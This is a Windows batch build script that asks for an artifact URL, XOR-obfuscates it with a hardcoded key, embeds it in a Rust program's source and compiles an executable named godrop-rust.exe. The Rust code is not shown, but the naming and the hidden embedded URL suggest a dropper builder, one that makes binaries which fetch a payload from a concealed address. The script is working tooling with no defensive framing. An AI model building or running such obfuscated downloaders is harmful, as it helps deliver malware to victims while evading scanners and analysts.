@echo off
setlocal

set /p URL=Enter direct artifact URL (http/https): 
if "%URL%"=="" (
  echo URL is required.
  exit /b 1
)

if not exist ..\..\dist mkdir ..\..\dist

for /f "usebackq delims=" %%H in (`powershell -NoProfile -Command "$k=[Text.Encoding]::UTF8.GetBytes('GoDropEmbedKey2026');$u=[Text.Encoding]::UTF8.GetBytes($env:URL);$o=for($i=0;$i -lt $u.Length;$i++){ '{0:x2}' -f ($u[$i] -bxor $k[$i %% $k.Length]) };($o -join '')"`) do set ENC_URL=%%H
if "%ENC_URL%"=="" (
  echo Failed to encrypt URL.
  exit /b 1
)

powershell -NoProfile -Command "(Get-Content src/main.rs -Raw).Replace('__ENC_URL__','%ENC_URL%') | Set-Content src/generated_main.rs"
if errorlevel 1 exit /b 1

copy src\main.rs src\main.rs.bak >nul
copy src\generated_main.rs src\main.rs >nul
if errorlevel 1 exit /b 1

echo Building Rust executable...
cargo build --release
if errorlevel 1 exit /b 1
copy target\release\godrop-rust.exe ..\..\dist\godrop-rust.exe >nul

copy src\main.rs.bak src\main.rs >nul 2>&1
del src\main.rs.bak >nul 2>&1
del src\generated_main.rs >nul 2>&1

echo Built: ..\..\dist\godrop-rust.exe
echo Embedded encrypted URL in binary.
endlocal
